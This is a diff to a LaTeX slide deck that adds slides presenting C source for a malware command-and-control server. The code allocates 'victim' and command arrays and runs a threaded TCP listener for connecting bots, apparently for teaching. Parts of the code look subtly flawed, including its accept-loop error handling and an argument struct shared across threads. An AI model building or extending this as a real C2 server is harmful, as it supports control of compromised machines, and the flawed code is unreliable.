@@ -274,4 +274,129 @@
   \end{center}
 \end{frame}
 
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{Create Victims Memory Data Structure}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        net_client_beacon_t **net_create_victims(){
+          int count = NET_MAX_CLIENTS;                      // Get Max Supported Clients Count
+          net_client_beacon_t **v;                          // Create Pointer to Data Structure
+          v = malloc(count * sizeof(net_client_beacon_t));  // Allocate Memory for Data Array
+          if (v == NULL){                                   // Error Checking
+            fprintf(stderr, "[x] %s\n", strerror(errno));
+            exit(EXIT_FAILURE);
+          }
+          for (int i = 0; i < count; i++){                  // Set to NULL
+            v[i] = NULL;
+          }
+          return v;                                         // Return Pointer to Data Structure Array
+        }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{Create Commands Memory Data Structure}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        net_server_beacon_t **net_create_commands(){
+          int count = NET_MAX_CLIENTS;                     // Get Max Supported Clients Count
+          net_server_beacon_t **v;                         // Create Pointer to Data Structure
+          v = malloc(count * sizeof(net_server_beacon_t)); // Allocate Memory for Data Array
+          if (v == NULL){                                  // Error Checking
+            fprintf(stderr, "[x] %s\n", strerror(errno));
+            exit(EXIT_FAILURE);
+          }
+          for (int i = 0; i < count; i++){                 // Set to NULL
+            v[i] = NULL;
+          }
+          return v;                                        // Return Pointer to Data Structure Array
+        }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{Command and Control in C Sockets}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        bool net_server(int port,
+                        net_client_beacon_t **p_victims,    // Victims Memory Array
+                        net_server_beacon_t **p_commands){  // Commands Memory Array
+          int server_fd, client_fd;
+          struct sockaddr_in server, client;
+          server_fd = socket(AF_INET, SOCK_STREAM, 0);      // Create Socket File Descriptor
+          if (server_fd < 0){                               // Error Checking for Socket
+            fprintf(stderr, "[x] %s\n", strerror(errno));
+            return false;
+          }
+          if (setsockopt(server_fd,                         // Socket File Descriptor
+                         SOL_SOCKET,                        // Manipulate Socket Options
+                         SO_REUSEADDR,                      // Permit Local Host Reuse
+                         &(int){ 1 },
+                         sizeof(int)) < 0){
+            fprintf(stderr, "[-] %s\n", strerror(errno));
+          }
+          memset(&server, 0, sizeof(server));              // Zero Out Server Struct
+          server.sin_family      = AF_INET;                // Set TCP Type
+          server.sin_port        = htons(port);            // Set Port
+          server.sin_addr.s_addr = htonl(INADDR_ANY);      // Any Addresses
+          // continued here...
+      }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{Command and Control in C Sockets}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+          if (bind(server_fd, (struct sockaddr *) &server, sizeof(server)) < 0){ return false; } // Bind to Socket
+          if (listen(server_fd, NET_MAX_CLIENTS)  != 0){ return false; }                         // Listen to Socket
+          while (true){
+            socklen_t client_len = sizeof(client);
+            net_t_client_args_t *p_net_t_client_args = malloc(sizeof(net_t_client_args_t));
+            while (( client_fd = accept(server_fd,                                      // Socket File Descriptor
+                                        (struct sockaddr *)&client,                     // Client SockAddr Struct
+                                        (socklen_t *)&client_len))){
+              pthread_t t_client;                                                       // Client Thread
+              p_net_t_client_args->client_fd = client_fd;                               // Send Client File Descriptor
+              p_net_t_client_args->p_victims = p_victims;                               // Pointer to Victims Struct
+              p_net_t_client_args->p_commands = p_commands;                             // Pointer to Commands Struct
+              pthread_attr_t attr_t_client;                                             // Create Thread Attributes
+              pthread_attr_init(&attr_t_client);                                        // Initialize Attributes
+              pthread_attr_setdetachstate(&attr_t_client, PTHREAD_CREATE_DETACHED);     // Set Detached Attribute
+              if (pthread_create(&t_client,
+                                 &attr_t_client, net_t_client, p_net_t_client_args) < 0){ // Spawn Client Thread
+                return false;
+              }
+            }
+            free(p_net_t_client_args); // Cleanup
+          }
+          close(client_fd);            // Close Client Socket File Descriptor
+          return true;
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
 \end{document}
